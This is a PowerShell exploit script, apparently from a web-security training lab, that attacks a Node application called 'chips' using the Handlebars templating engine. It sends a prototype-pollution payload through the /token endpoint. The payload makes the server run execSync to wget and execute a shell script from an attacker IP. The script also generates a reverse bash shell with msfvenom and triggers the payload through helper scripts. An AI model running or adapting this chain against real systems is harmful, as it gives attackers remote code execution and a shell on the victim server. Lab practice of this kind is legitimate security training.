Import-Module Posh-SSH;
[string]$userName = 'student'
[string]$userPassword = 'studentlab'
[string]$machine = 'chips'
[securestring]$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
[pscredential]$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)

$worker = New-SSHSession -ComputerName $machine -Credential $credObject
$worker
$result = Invoke-SSHCommand -Command 'docker-compose -f /home/student/chips/docker-compose.yml down && export TEMPLATING_ENGINE=hbs && docker-compose -f /home/student/chips/docker-compose.yml up -d' -SSHSession $worker
$result

Write-Output "Allowing application to start up sleeping for 10 seconds ..."
Start-Sleep -Seconds 10

$res = iwr -Uri http://chips/ | sls -Pattern '<!-- Using Handlebars as Templating Engine -->' | % -process {$_.Matches.Value}
Write-Output "Templating engine: $res"

$ip="192.168.119.234"
$json_obj = @{
  "connection"= [ordered]@{
    "type"="rdp";
    "settings"=[ordered] @{
      "hostname"="rdesktop";
      "username"="abc";
      "password"="abc";
      "port"="3389";
      "security"="any";
      "ignore-cert"="true";
      "client-name"="";
      "console"="false";
      "initial-program"="";
      "__proto__" = [ordered]@{
        "type" = "Program";
        "body" = @(
          [ordered]@{
            "type" = "MustacheStatement";
            "path" =  0;
            "loc" = 0;
            "params" = @(
              [ordered]@{
                "type" = "NumberLiteral";
                #"type" = "BooleanLiteral"; this is also a viable alternative
                "value" = "process.mainModule.require('child_process').execSync('/usr/bin/wget http://$ip/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; sh /tmp/shell.sh &')";
              }
            );
          };
        );
      }
    }
  }
}
# pollute the outputFunctionName variable in hbs
$json = convertto-json $json_obj -depth 10
$res = Invoke-WebRequest -Uri "http://$machine/token" -method Post -body $json -ContentType 'application/json' -SkipHttpErrorCheck -Proxy http://127.0.0.1:8080/
$res_content = ConvertFrom-Json $res.Content
Write-Output "rdp token: $($res_content.token)
"
# The guaclite tunnel is triggered by the /rdp endpoint but it uses window.location.search to populate the rdp token for the guaclite tunnel so we use selenium + headless firefox to "proxy" a connection over the guaclite tunnel.
$status = python trigger-guaclite-tunnel.py --token $res_content.token
Write-Host "Status: $status"

# generate shellcode
msfvenom -p cmd/unix/reverse_bash lhost=$ip lport=4444 -f raw -o shell.sh

#The last part would be to visit any page of the web application to activate the shell, seems like this must be done from a browser as well.
#iwr -Uri http://chips/ -SkipHttpErrorCheck
Start-Job -ScriptBlock { python visit-page.py }

Write-Output "Sleep for payload request ..."
Start-Sleep -Seconds 5

# cleanup
Remove-Item shell.sh